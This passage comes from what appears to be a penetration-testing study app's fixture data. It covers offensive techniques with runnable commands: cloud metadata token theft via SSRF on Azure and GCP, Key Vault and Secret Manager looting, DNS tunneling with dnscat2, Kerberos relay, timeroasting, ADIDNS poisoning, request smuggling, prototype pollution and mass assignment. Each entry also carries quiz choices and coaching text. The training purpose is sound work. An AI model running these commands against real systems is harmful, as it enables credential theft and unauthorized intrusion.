              "out": "{\"compute\":{\"name\":\"web-vm\",\"resourceGroupName\":\"rg-prod\"}}",
              "sig": "resourceGroupName",
              "teach": "Instance metadata confirms an Azure VM and names the resource group, so a managed-identity token is likely reachable."
            }
          ]
        }
      ],
      "how": {
        "lead": "Azure IMDS abuse is pull a resource-scoped token through the SSRF, then use it to enumerate and loot the subscription.",
        "items": [
          {
            "t": "Request a management token",
            "d": "Ask the metadata service for a token scoped to the ARM management API, passing Metadata:true. The SSRF must smuggle that header.",
            "demo": [
              {
                "run": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
                "out": "{\"access_token\":\"eyJ0eXAiOiJKV1Qi...\"}",
                "sig": "\"access_token\""
              }
            ],
            "note": "A separate token is needed per resource (Key Vault uses resource=https://vault.azure.net)."
          },
          {
            "t": "Enumerate with the token",
            "d": "Load the token into the az CLI (or call REST directly) and list what the identity can see: subscriptions, resource groups, VMs, Key Vaults.",
            "demo": [
              {
                "run": "az rest --url 'https://management.azure.com/subscriptions?api-version=2020-01-01' --headers \"Authorization=Bearer {{token}}\"",
                "out": "\"displayName\": \"Production\"",
                "sig": "displayName"
              }
            ],
            "note": "The role assignment on the identity decides how far you get."
          },
          {
            "t": "Loot Key Vault secrets",
            "d": "A Key Vault token reads stored secrets, which routinely include database and admin credentials that reuse onto the hosts you are attacking.",
            "demo": [
              {
                "run": "az keyvault secret show --id 'https://kv-prod.vault.azure.net/secrets/db-password'",
                "out": "\"value\": \"Pr0dDbP@ss\"",
                "sig": "Pr0dDbP@ss"
              }
            ],
            "note": "Feed recovered secrets into the credential loop."
          },
          {
            "t": "Look for code execution",
            "d": "A Contributor or VM-admin role lets you runCommand on a VM for a shell, or create a resource that hands you one.",
            "demo": [
              {
                "run": "az vm run-command invoke -g rg-prod -n web-vm --command-id RunShellScript --scripts 'id'",
                "out": "\"message\": \"uid=0(root)\"",
                "sig": "uid=0(root)"
              }
            ],
            "note": "runCommand executes as root/SYSTEM on the target VM."
          }
        ]
      },
      "situation": "An SSRF on an Azure VM can reach 169.254.169.254 with a Metadata header. What turns it into access?",
      "choices": [
        "azure-imds",
        "aws-credential-abuse",
        "ssrf",
        "content-discovery"
      ],
      "coach": {
        "aws-credential-abuse": "That is the AWS metadata path; this is Azure, which needs a resource-scoped token and the Metadata header.",
        "ssrf": "The SSRF is how you reach the metadata service; now pull a managed-identity token and use it.",
        "content-discovery": "You are past the web app; the surface now is the Azure subscription the identity can see."
      }
    },
    "dns-tunnel": {
      "why": "When a foothold can resolve DNS but every other outbound port is filtered, DNS itself becomes your transport. A DNS tunnel encodes data in the names and responses of queries to a domain whose authoritative server you control, giving you a (slow) interactive channel or a tunnel for other tools when nothing else gets out. It is the escape hatch for egress-restricted boxes and the quiet option when you want traffic that looks like ordinary lookups. dnscat2 or iodine run a server on your box and a client on the target; once the session is up you pivot through it. Reach for it only when the faster transports (a reverse shell, an SSH tunnel) are blocked.",
      "cmd": "nslookup -type=txt test.{{domain}} {{target}}",
      "tool": "sh",
      "output": "test.acme.internal   text = \"tunnel-ready\"",
      "signal": "tunnel-ready",
      "teach": "The box can resolve arbitrary names against a server you control, so DNS is a viable channel. Stand up a dnscat2 or iodine server on your box and run the client on the target to open the tunnel.",
      "leadup": [
        {
          "key": "egress",
          "label": "Other egress is blocked",
          "steps": [
            {
              "title": "Only DNS gets out",
              "tool": "sh",
              "where": "target",
              "cmd": "curl -m 5 http://{{lhost}} || echo blocked; nslookup {{lhost}} 2>/dev/null | head -1",
              "out": "blocked\nServer:  10.10.14.5",
              "sig": "blocked",
              "teach": "HTTP is filtered but DNS resolves, which is exactly when a DNS tunnel is the way out."
            }
          ]
        }
      ],
      "how": {
        "lead": "A DNS tunnel is confirm DNS egress, run the server on your box, run the client on the target, then pivot through it.",
        "items": [
          {
            "t": "Confirm DNS is your only channel",
            "d": "Test the fast transports first; a DNS tunnel is slow, so use it only when a reverse shell and an SSH tunnel are both blocked.",
            "demo": [
              {
                "run": "curl -m 5 http://{{lhost}} || echo blocked",
                "out": "blocked",
                "sig": "blocked"
              }
            ],
            "note": "If anything faster works, use that instead."
          },
          {
            "t": "Run the tunnel server on your box",
            "d": "dnscat2 (or iodine) listens on your attacker box as the authoritative handler for a domain you control.",
            "demo": [
              {
                "run": "dnscat2-server {{domain}}",
                "out": "Starting DNS server on 0.0.0.0:53 for domain {{domain}}",
                "sig": "Starting DNS server",
                "teach": ""
              }
            ],
            "note": "You need a domain delegated to your server, or a direct nameserver the target can reach."
          },
          {
            "t": "Run the client on the target",
            "d": "The client encodes its traffic into queries for your domain, which your server decodes into a session.",
            "demo": [
              {
                "run": "./dnscat {{domain}}",
                "out": "Session established!",
                "sig": "Session established!",
                "teach": ""
              }
            ],
            "note": "The session is interactive but slow; keep commands terse."
          },
          {
            "t": "Pivot through the tunnel",
            "d": "Use the session as a shell, or forward a port through it to reach services the box can see but you cannot.",
            "demo": [
              {
                "run": "dnscat2> window -i 1",
                "out": "command (target) 1>",
                "sig": "command (target)",
                "teach": ""
              }
            ],
            "note": "From here the normal pivoting workflow applies, just over DNS."
          }
        ]
      },
      "situation": "Your foothold can resolve DNS but every other outbound port is filtered, so a reverse shell will not connect. What is the move?",
      "choices": [
        "dns-tunnel",
        "pivot-chisel-socks",
        "shell-revshell-linux",
        "pivot-ligolo"
      ],
      "coach": {
        "pivot-chisel-socks": "chisel needs an open TCP port outbound, which is blocked here; DNS is the only channel.",
        "shell-revshell-linux": "A reverse shell cannot connect when outbound TCP is filtered; tunnel over DNS instead.",
        "pivot-ligolo": "ligolo also needs TCP egress; when only DNS resolves, dnscat2/iodine is the escape hatch."
      }
    }
  };
  Object.keys(GAPFILL4).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL4[k]; });

  // --- Phase-E gap-fill: AD + cloud radar (beyond OSCP) ---
  var GAPFILL5E = {
    "kerberos-relay": {
      "why": "NTLM relay is well known, but Kerberos can be relayed too, and it bypasses the SMB-signing defence that stops the NTLM version. You coerce a privileged machine (a DC, or any host) into authenticating to you with Kerberos, then relay that AP-REQ to a service that does not check channel binding (LDAP, or an AD CS web-enrollment endpoint). Relayed to LDAP you can write RBCD or shadow credentials onto the victim; relayed to AD CS you enrol a certificate as the victim machine, then authenticate as it. It is the modern answer when SMB signing is on everywhere and the classic NTLM relay is dead.",
      "cmd": "krbrelayx.py -t ldap://dc01.acme.internal --add-computer evilpc",
      "tool": "krbrelayx",
      "output": "[*] Authenticating against ldap://dc01.acme.internal as ACME\\DC01$\n[*] Adding new computer with username: evilpc$\n[*] Added msDS-AllowedToActOnBehalfOfOtherIdentity",
      "signal": "Added msDS-AllowedToActOnBehalfOfOtherIdentity",
      "teach": "The coerced Kerberos ticket was relayed to LDAP and wrote resource-based constrained delegation onto the victim. You can now request a service ticket as any user to it, which is SYSTEM on that host.",
      "leadup": [
        {
          "key": "coerce",
          "label": "You can coerce Kerberos auth",
          "steps": [
            {
              "title": "Confirm a coercion vector",
              "tool": "coercer",
              "where": "local",
              "cmd": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l {{lhost}}",
              "out": "[+] (MS-RPRN) PrinterBug triggered, authentication incoming",
              "sig": "authentication incoming",
              "teach": "A reachable coercion method (PrinterBug, PetitPotam, DFSCoerce) is what forces the victim to authenticate to your relay."
            }
          ]
        },
        {
          "key": "signing",
          "label": "SMB signing stops NTLM relay",
          "steps": [
            {
              "title": "Check SMB signing",
              "tool": "nxc",
              "where": "local",
              "cmd": "nxc smb {{target}} --gen-relay-list relay.txt",
              "out": "SMB  {{target}}  signing:True (NTLM relay not possible)",
              "sig": "signing:True",
              "teach": "Signing enforced kills the NTLM relay, which is exactly when the Kerberos relay is the way through."
            }
          ]
        }
      ],
      "how": {
        "lead": "A Kerberos relay is coerce the victim to authenticate with Kerberos, relay the ticket to LDAP or AD CS, and use what that grants.",
        "items": [
          {
            "t": "Set up the relay with a spoofed name",
            "d": "Kerberos tickets are bound to a service name, so you relay through a DNS name that resolves to you (an ADIDNS record, or a name the target already trusts).",
            "demo": [
              {
                "run": "krbrelayx.py -t ldap://dc01.acme.internal --add-computer evilpc",
                "out": "[*] Listening for incoming Kerberos authentication",
                "sig": "Listening for incoming Kerberos"
              }
            ],
            "note": "The relay target decides the win: LDAP for RBCD/shadow-cred, AD CS for a certificate."
          },
          {
            "t": "Coerce the victim",
            "d": "Trigger a coercion method so the victim authenticates to your spoofed name with Kerberos.",
            "demo": [
              {
                "run": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l evilpc.acme.internal",
                "out": "[+] PrinterBug triggered, authentication incoming",
                "sig": "authentication incoming"
              }
            ],
            "note": "The victim authenticates as its machine account, which is what you relay."
          },
          {
            "t": "Relay to LDAP for RBCD",
            "d": "The relayed ticket writes msDS-AllowedToActOnBehalfOfOtherIdentity on the victim, delegating it to a computer account you control.",
            "demo": [
              {
                "run": "getST.py -spn cifs/victim.acme.internal -impersonate administrator 'acme.internal/evilpc$:{{password}}'",
                "out": "Saving ticket in administrator.ccache",
                "sig": "Saving ticket in administrator.ccache"
              }
            ],
            "note": "The service ticket impersonates Administrator to the victim: SYSTEM on that host."
          },
          {
            "t": "Or relay to AD CS",
            "d": "Relayed to the web-enrollment endpoint, you enrol a machine certificate, then authenticate with it for the victim's hash.",
            "demo": [
              {
                "run": "certipy auth -pfx victim.pfx -dc-ip {{target}}",
                "out": "Got hash for 'victim$@acme.internal'",
                "sig": "Got hash for"
              }
            ],
            "note": "The machine hash is a foothold or a DCSync step depending on the victim."
          }
        ]
      },
      "situation": "SMB signing is enforced everywhere, so NTLM relay is dead, but you can coerce a host to authenticate. What is the move?",
      "choices": [
        "kerberos-relay",
        "ntlm-relay-attack",
        "coerce-auth",
        "kerberoast"
      ],
      "coach": {
        "ntlm-relay-attack": "Signing enforced kills the NTLM relay; the Kerberos relay is not stopped by SMB signing.",
        "coerce-auth": "Coercion is how you trigger the auth; relaying the Kerberos ticket is what turns it into access.",
        "kerberoast": "Roasting needs an SPN and a crackable password; the relay turns a coerced ticket straight into delegation."
      }
    },
    "timeroasting": {
      "why": "Timeroasting abuses the old MS-SNTP authentication in the Windows Time service: a client can ask the DC to sign an NTP reply using a computer account's NT hash as the key, and crucially it can do this for any computer RID without authenticating at all. You collect those signed replies, which are effectively NetNTLM-style hashes of each machine account, and crack them offline. Machine-account passwords are usually random and uncrackable, but plenty of environments have appliances, clusters, or old hosts with weak or scripted machine passwords, and one of those is a foothold with no credential spent to get it.",
      "cmd": "python3 timeroast.py {{target}} | tee timeroast.hashes",
      "tool": "timeroast",
      "output": "1000:$sntp-ms$a1b2c3...$010203...\n1103:$sntp-ms$d4e5f6...$040506...",
      "signal": "$sntp-ms$",
      "teach": "Each line is a crackable hash of a computer account (keyed by its RID), pulled with no authentication. Crack them offline; a weak machine password is an unauthenticated foothold.",
      "leadup": [
        {
          "key": "dc",
          "label": "A DC is reachable",
          "steps": [
            {
              "title": "Confirm the DC and NTP",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -sU -p123 {{target}}",
              "out": "123/udp open  ntp",
              "sig": "123/udp open",
              "teach": "The Windows Time service on a DC is what answers the signed-reply requests timeroasting abuses."
            }
          ]
        }
      ],
      "how": {
        "lead": "Timeroasting is request signed time replies for each computer RID, collect the hashes, and crack them offline.",
        "items": [
          {
            "t": "Collect the hashes",
            "d": "The tool walks computer RIDs and asks the DC to sign a time reply with each account's key, with no authentication at all.",
            "demo": [
              {
                "run": "python3 timeroast.py {{target}} | tee timeroast.hashes",
                "out": "1000:$sntp-ms$a1b2c3...$010203...",
                "sig": "$sntp-ms$"
              }
            ],
            "note": "No credential is needed; this works pre-auth against the DC."
          },
          {
            "t": "Crack them offline",
            "d": "Feed the hashes to hashcat in the timeroast mode and run a wordlist; weak or scripted machine passwords fall.",
            "demo": [
              {
                "run": "hashcat -m 31300 timeroast.hashes {{wordlist}}",
                "out": "1103:$sntp-ms$d4e5f6...:Autumn2024",
                "sig": ":Autumn2024"
              }
            ],
            "note": "Most machine passwords are random, but appliances and old hosts often are not."
          },
          {
            "t": "Map the RID to a host",
            "d": "Resolve the cracked RID back to a computer name so you know which host the password belongs to.",
            "demo": [
              {
                "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --query '(objectSid=*-1103)' 'sAMAccountName'",
                "out": "sAMAccountName: APPLIANCE01$",
                "sig": "APPLIANCE01$"
              }
            ],
            "note": "A machine credential authenticates as that host and often reuses onto its services."
          }
        ]
      },
      "situation": "You have no credential yet, but a DC is reachable and you want machine-account hashes without touching Kerberos pre-auth. What is the move?",
      "choices": [
        "timeroasting",
        "asrep-roast",
        "kerberoast",
        "password-spray"
      ],
      "coach": {
        "asrep-roast": "AS-REP roasting needs user accounts with pre-auth disabled; timeroasting pulls computer hashes with no auth at all.",
        "kerberoast": "Roasting needs a valid domain credential first; timeroasting is fully unauthenticated.",
        "password-spray": "Spraying needs a user list and risks lockout; timeroasting hands you offline hashes instead."
      }
    },
    "adidns-abuse": {
      "why": "Active Directory integrated DNS lets any authenticated user create DNS records by default, and that is a surprisingly sharp primitive. A wildcard record (*.acme.internal) makes you the answer for every name that does not already exist, so you intercept the traffic of misconfigured clients; a WPAD record turns on proxy auto-discovery you control, capturing web auth; and a record you own is the name a coerced or relayed authentication is sent to. It is the quiet enabler under a lot of relay chains: you need a name that resolves to your box, and ADIDNS hands you one with a single authenticated LDAP write.",
      "cmd": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
      "tool": "dnstool",
      "output": "[+] Adding new record\n[+] LDAP operation completed successfully",
      "signal": "LDAP operation completed successfully",
      "teach": "The wildcard record is live, so any name with no explicit record now resolves to you. That captures mistyped and fallback lookups, and gives relay chains a name that points at your listener.",
      "leadup": [
        {
          "key": "cred",
          "label": "You hold a domain credential",
          "steps": [
            {
              "title": "Confirm you can write DNS",
              "tool": "nxc",
              "where": "local",
              "cmd": "nxc ldap {{target}} -u {{user}} -p '{{password}}'",
              "out": "LDAP  {{target}}  [+] acme.internal\\{{user}}",
              "sig": "[+] acme.internal",
              "teach": "Any authenticated user can create ADIDNS records by default, which is all this needs."
            }
          ]
        }
      ],
      "how": {
        "lead": "ADIDNS abuse is write a record that points a useful name at you, then collect what resolves to it.",
        "items": [
          {
            "t": "Add a wildcard record",
            "d": "A wildcard answers every name without an explicit record, so you catch fallback and mistyped lookups across the domain.",
            "demo": [
              {
                "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
                "out": "[+] LDAP operation completed successfully",
                "sig": "LDAP operation completed successfully"
              }
            ],
            "note": "Give it a few minutes to replicate before you expect hits."
          },
          {
            "t": "Or add a WPAD record",
            "d": "A WPAD record turns on proxy auto-discovery pointed at you, which captures the web authentication of clients that honour it.",
            "demo": [
              {
                "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r wpad -d {{lhost}} {{target}}",
                "out": "[+] LDAP operation completed successfully",
                "sig": "LDAP operation completed successfully"
              }
            ],
            "note": "WPAD is often blocked by GPO; the wildcard is the more reliable primitive."
          },
          {
            "t": "Capture what resolves to you",
            "d": "Run a responder-style listener on your box; names that now resolve to you send their authentication straight to it.",
            "demo": [
              {
                "run": "responder -I {{iface}} -w",
                "out": "[SMB] NTLMv2-SSP Hash : ACME\\jsmith",
                "sig": "NTLMv2-SSP Hash",
                "teach": ""
              }
            ],
            "note": "Feed the captured hash into the crack or the relay loop."
          },
          {
            "t": "Feed a relay",
            "d": "The record also gives a coerced or relayed authentication a name that points at your listener, which is what the Kerberos and NTLM relays need.",
            "note": "This is why ADIDNS sits under so many relay chains."
          }
        ]
      },
      "situation": "You have one domain credential and need a name in the domain that resolves to your box, to capture auth or anchor a relay. What is the move?",
      "choices": [
        "adidns-abuse",
        "mitm6-ipv6-takeover",
        "responder-poison",
        "coerce-auth"
      ],
      "coach": {
        "mitm6-ipv6-takeover": "mitm6 works where IPv6 is on; ADIDNS writes a durable name in IPv4 DNS with the credential you already hold.",
        "responder-poison": "Responder answers link-local name requests; ADIDNS plants an authoritative record the whole domain honours.",
        "coerce-auth": "Coercion forces the auth; ADIDNS gives it a name to be sent to."
      }
    },
    "gcp-metadata": {
      "why": "Google Cloud's metadata server at 169.254.169.254 hands out an OAuth access token for the instance's attached service account to anything that can reach it, so a server-side request forgery on a GCP-hosted app is a token for the project. Like Azure it needs a header (Metadata-Flavor: Google) that the SSRF has to smuggle, and the token's reach is whatever scopes and IAM roles the service account carries. With the token you enumerate the project, read Secret Manager and Cloud Storage, and look for a role (or an actAs on another service account) that lets you deploy a function or a VM and run code. It is the GCP twin of the AWS and Azure metadata paths, and increasingly in scope.",
      "cmd": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
      "tool": "curl",
      "output": "{\"access_token\":\"ya29.a0Af...\",\"expires_in\":3599,\"token_type\":\"Bearer\"}",
      "signal": "ya29.",
      "teach": "The service-account OAuth token came back (GCP tokens start ya29.). Use it with gcloud or the REST API to enumerate the project, read Secret Manager, and hunt for a role that runs code.",
      "leadup": [
        {
          "key": "ssrf",
          "label": "SSRF reaches the metadata server",
          "steps": [
            {
              "title": "Confirm you are on GCP",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -H 'Metadata-Flavor: Google' 'http://<target>/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/?recursive=true'",
              "out": "{\"machineType\":\"projects/12345/machineTypes/e2-medium\",\"zone\":\"projects/12345/zones/us-central1-a\"}",
              "sig": "machineType",
              "teach": "Instance metadata confirms a GCP VM and names the project, so a service-account token is likely reachable."
            }
          ]
        }
      ],
      "how": {
        "lead": "GCP metadata abuse is smuggle the token out through the SSRF, then use it to enumerate and loot the project.",
        "items": [
          {
            "t": "Pull the service-account token",
            "d": "Ask the metadata server for the default service account's OAuth token, passing the Metadata-Flavor header the SSRF must smuggle.",
            "demo": [
              {
                "run": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
                "out": "{\"access_token\":\"ya29.a0Af...\"}",
                "sig": "ya29."
              }
            ],
            "note": "Check the account's scopes at .../default/scopes; a cloud-platform scope is the broad one."
          },
          {
            "t": "Enumerate what the token can see",
            "d": "Load the token into gcloud or call the REST API to list projects, buckets, secrets, and service accounts the identity can reach.",
            "demo": [
              {
                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://cloudresourcemanager.googleapis.com/v1/projects'",
                "out": "\"projectId\": \"acme-prod\"",
                "sig": "projectId"
              }
            ],
            "note": "The IAM roles on the service account decide how far you get."
          },
          {
            "t": "Loot Secret Manager and Storage",
            "d": "Read stored secrets and bucket objects, which routinely hold database and admin credentials that reuse onto the hosts you are attacking.",
            "demo": [
              {
                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://secretmanager.googleapis.com/v1/projects/acme-prod/secrets/db-password/versions/latest:access'",
                "out": "\"payload\":{\"data\":\"UHIwZERiUEBzcw==\"}",
                "sig": "payload",
                "teach": ""
              }
            ],
            "note": "The value is base64; decode it and feed it into the credential loop."
          },
          {
            "t": "Look for code execution",
            "d": "A role that lets you actAs a service account and deploy a function or VM gives you execution in the project.",
            "demo": [
              {
                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://iam.googleapis.com/v1/projects/acme-prod/serviceAccounts'",
                "out": "\"email\": \"deployer@acme-prod.iam.gserviceaccount.com\"",
                "sig": "gserviceaccount.com"
              }
            ],
            "note": "actAs on a privileged service account is the escalation to execution."
          }
        ]
      },
      "situation": "An SSRF on a GCP VM can reach 169.254.169.254 with the Metadata-Flavor header. What turns it into access?",
      "choices": [
        "gcp-metadata",
        "azure-imds",
        "aws-credential-abuse",
        "ssrf"
      ],
      "coach": {
        "azure-imds": "That is the Azure path; GCP uses the Metadata-Flavor header and an OAuth token that starts ya29.",
        "aws-credential-abuse": "That is the AWS path; GCP hands an OAuth token, not AWS keys.",
        "ssrf": "The SSRF is how you reach the metadata server; now pull the service-account token and use it."
      }
    }
  };
  Object.keys(GAPFILL5E).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5E[k]; });

  // --- Phase-F gap-fill: modern web radar (beyond OSCP) ---
  var GAPFILL5F = {
    "http-request-smuggling": {
      "why": "When a front-end proxy and a back-end server disagree about where one HTTP request ends and the next begins, you can smuggle a second request inside the first. The disagreement comes from the two headers that both declare body length, Content-Length and Transfer-Encoding: craft a request where the front-end honours one and the back-end the other (CL.TE or TE.CL) and the back-end treats your trailing bytes as the start of the next victim request. That lets you poison the next user's response, bypass front-end access controls, or capture other users' requests. It is subtle and high-impact, and it only shows up where a request passes through more than one HTTP parser.",
      "cmd": "curl -s -o /dev/null -w '%{http_code} %{time_total}\\n' --data-binary @clte.txt http://10.10.10.10/",
      "tool": "curl",
      "output": "200 5.02",
      "signal": "5.02",
      "teach": "The timed delay is the tell: the back-end is waiting for bytes that never come because the front-end already forwarded a shortened request. That timing gap confirms a CL.TE desync worth developing into a smuggled request.",
      "leadup": [
        {
          "key": "chain",
          "label": "A request passes two parsers",
          "steps": [
            {
              "title": "Spot a front-end proxy",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sI http://<target>/ | grep -iE 'Via|X-Cache|Server'",
              "out": "Via: 1.1 varnish\nX-Cache: MISS",
              "sig": "Via: 1.1 varnish",
              "teach": "A Via or cache header means a front-end sits in front of the origin, which is the precondition for a desync."
            }
          ]
        }
      ],
      "how": {
        "lead": "Request smuggling is find the CL/TE disagreement, confirm it with a timing probe, then develop it into a smuggled request.",
        "items": [
          {
            "t": "Probe for a desync with timing",
            "d": "Send a CL.TE (or TE.CL) probe where the back-end is left waiting for a body chunk; a long, consistent delay confirms the desync while a well-formed control request returns instantly.",
            "demo": [
              {
                "run": "curl -s -o /dev/null -w '%{time_total}\\n' --data-binary @clte-probe.txt http://<target>/",
                "out": "5.01",
                "sig": "5.01"
              }
            ],
            "note": "Burp's smuggler extension automates the probe and tells you which variant works."
          },
          {
            "t": "Confirm with a well-formed control",
            "d": "The same request made unambiguous should return fast; the difference rules out ordinary latency.",
            "demo": [
              {
                "run": "curl -s -o /dev/null -w '%{time_total}\\n' --data-binary @control.txt http://<target>/",
                "out": "0.08",
                "sig": "0.08"
              }
            ],
            "note": "A clear fast/slow split is the signature of a real desync."
          },
          {
            "t": "Smuggle a prefix",
            "d": "Prepend a request that the back-end queues; the next victim request gets your prefix glued to its front, so you can route it to an admin path or capture it.",
            "demo": [
              {
                "run": "curl -s --data-binary @smuggle.txt http://<target>/ | grep -i 'admin'",
                "out": "HTTP/1.1 200 OK\\nX-Admin: true",
                "sig": "X-Admin: true"
              }
            ],
            "note": "Developing the gadget is iterative; keep the back-end queue in mind."
          },
          {
            "t": "Turn it into impact",
            "d": "Depending on the app, smuggling bypasses the front-end control, poisons the shared cache, or captures another user's authenticated request.",
            "note": "Scope this carefully; it affects other users' traffic."
          }
        ]
      },
      "situation": "A request passes through a caching proxy to an origin, and a CL.TE timing probe hangs for five seconds while the control returns instantly. What is the move?",
      "choices": [
        "http-request-smuggling",
        "check-cors",
        "ssrf",
        "content-discovery"
      ],
      "coach": {
        "check-cors": "CORS is a browser control; the desync here is a server-side parser disagreement between the proxy and the origin.",
        "ssrf": "SSRF makes the server fetch a URL; smuggling abuses how two servers frame the same request.",
        "content-discovery": "You already have the surface; the finding is the parser disagreement, not an undiscovered path."
      }
    },
    "prototype-pollution": {
      "why": "In JavaScript every object inherits from Object.prototype, so if an app merges attacker-controlled keys into an object without filtering __proto__ (or constructor.prototype), you can add or change properties on that shared prototype and every object in the process sees them. Server-side that turns into privilege escalation (set an isAdmin the app later reads), denial of service, or, where a dangerous property feeds a sink like a template engine or child_process option, remote code execution via a known gadget. The tell is a JSON merge, an Object.assign, or a query-string parser that walks nested keys. Find the pollutable sink first, then find the gadget that reads the polluted property.",
      "cmd": "curl -s -X POST http://10.10.10.10/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
      "tool": "curl",
      "output": "{\"status\":\"ok\",\"profile\":{\"name\":\"bob\",\"polluted\":\"yes\"}}",
      "signal": "\"polluted\":\"yes\"",
      "teach": "The property you set via __proto__ came back on an object that never had it, so the merge polluted the shared prototype. Now find a gadget that reads a privileged property (isAdmin, or a template/exec option) to turn pollution into impact.",
      "leadup": [
        {
          "key": "merge",
          "label": "The app merges your JSON",
          "steps": [
            {
              "title": "Find a nested-key sink",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -X POST http://<target>/api/settings -H 'Content-Type: application/json' -d '{\"a\":{\"b\":1}}'",
              "out": "{\"status\":\"ok\",\"settings\":{\"a\":{\"b\":1}}}",
              "sig": "\"a\":{\"b\":1}",
              "teach": "An endpoint that accepts and stores nested JSON is a candidate for a recursive merge that honours __proto__."
            }
          ]
        }
      ],
      "how": {
        "lead": "Prototype pollution is confirm the pollutable merge, then chain it to a gadget that reads the polluted property.",
        "items": [
          {
            "t": "Confirm the pollution",
            "d": "Send a __proto__ key and read back an object that should not carry it; if your property appears, the merge pollutes the shared prototype.",
            "demo": [
              {
                "run": "curl -s -X POST http://<target>/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
                "out": "{\"profile\":{\"name\":\"bob\",\"polluted\":\"yes\"}}",
                "sig": "\"polluted\":\"yes\""
              }
            ],
            "note": "constructor.prototype is the fallback when __proto__ is filtered."
          },
          {
            "t": "Escalate via a privileged property",
            "d": "Pollute a property the app trusts for authorization, then hit an endpoint that reads it.",
            "demo": [
              {
                "run": "curl -s -X POST http://<target>/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'",
                "out": "{\"status\":\"ok\"}",
                "sig": "\"status\":\"ok\""
              }
            ],
            "note": "Then request an admin route and see whether the polluted isAdmin is honoured."
          },
          {
            "t": "Chain to a gadget for RCE",
            "d": "Where a polluted property reaches a template engine or a child_process option, a published gadget turns pollution into code execution.",
            "demo": [
              {
                "run": "curl -s http://<target>/admin -b session=... | grep -i 'dashboard'",
                "out": "<title>Admin Dashboard</title>",
                "sig": "Admin Dashboard"
              }
            ],
            "note": "The gadget is app-specific; map the libraries in use to the known pollution gadgets."
          }
        ]
      },
      "situation": "A JSON endpoint merges nested keys, and sending __proto__ makes a new property appear on an unrelated object. What is the move?",
      "choices": [
        "prototype-pollution",
        "mass-assignment",
        "idor",
        "ssti"
      ],
      "coach": {
        "mass-assignment": "Mass assignment sets a field on your own record; this pollutes the shared prototype so every object inherits it.",
        "idor": "IDOR reaches another object by id; here you are changing the prototype all objects derive from.",
        "ssti": "Template injection evaluates an expression; prototype pollution may feed a template gadget, but the primitive is the polluted merge."
      }
    },
    "mass-assignment": {
      "why": "Mass assignment (autobinding) is what happens when a framework maps every field of a request body straight onto a model, and the developer forgets that the request can carry fields the UI never shows. Add role, isAdmin, verified, or balance to the JSON of a profile update or a signup, and if the binder is not allow-listed you set a property you were never meant to control. It is a one-request privilege escalation that needs no exotic tooling: diff the fields the app returns against the fields it accepts, then send the privileged one back. The tell is any create/update endpoint that echoes an object with more fields than the form exposes.",
      "cmd": "curl -s -X PATCH http://10.10.10.10/api/users/me -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'",
      "tool": "curl",
      "output": "{\"id\":7,\"username\":\"bob\",\"role\":\"admin\"}",
      "signal": "\"role\":\"admin\"",
      "teach": "The update accepted a role field the form never exposed and set it to admin, so the binder is not allow-listed. You just escalated your own account with one request.",
      "leadup": [
        {
          "key": "fields",
          "label": "The object has hidden fields",
          "steps": [
            {
              "title": "Read your own record",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://<target>/api/users/me -b session=...",
              "out": "{\"id\":7,\"username\":\"bob\",\"role\":\"user\",\"verified\":true}",
              "sig": "\"role\":\"user\"",
              "teach": "The response exposes a role field the signup form never showed, which is exactly the field to try setting."
            }
          ]
        }
      ],
      "how": {
        "lead": "Mass assignment is diff accepted fields against shown fields, then send the privileged one back.",
        "items": [
          {
            "t": "Inventory the model fields",
            "d": "Read an object the API returns; every field it shows is a candidate you may be able to write, including ones the form hides.",
            "demo": [
              {
                "run": "curl -s http://<target>/api/users/me -b session=...",
                "out": "{\"id\":7,\"role\":\"user\",\"verified\":true,\"balance\":0}",
                "sig": "\"role\":\"user\""
              }
            ],
            "note": "role, isAdmin, verified, and balance are the classic privileged fields."
          },
          {
            "t": "Send the privileged field back",
            "d": "Add the field to an update request the UI would never include it in, and see whether the binder accepts it.",
            "demo": [
              {
                "run": "curl -s -X PATCH http://<target>/api/users/me -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' -b session=...",
                "out": "{\"id\":7,\"username\":\"bob\",\"role\":\"admin\"}",
                "sig": "\"role\":\"admin\""
              }
            ],
            "note": "If it echoes the new value, the write stuck."
          },
          {
            "t": "Confirm the escalation",
            "d": "Use the account on a privileged route to confirm the new field is honoured, not just stored.",
            "demo": [
              {
                "run": "curl -s http://<target>/admin -b session=... | grep -i 'dashboard'",
                "out": "<title>Admin Dashboard</title>",
                "sig": "Admin Dashboard"
              }
            ],
            "note": "Stored-but-ignored is a weaker finding than stored-and-honoured; prove which it is."
          },
          {
            "t": "Try it at signup too",
            "d": "The create endpoint is often less guarded than update; set the privileged field in the registration body.",
            "demo": [
              {
                "run": "curl -s -X POST http://<target>/api/register -H 'Content-Type: application/json' -d '{\"username\":\"x\",\"password\":\"x\",\"role\":\"admin\"}'",
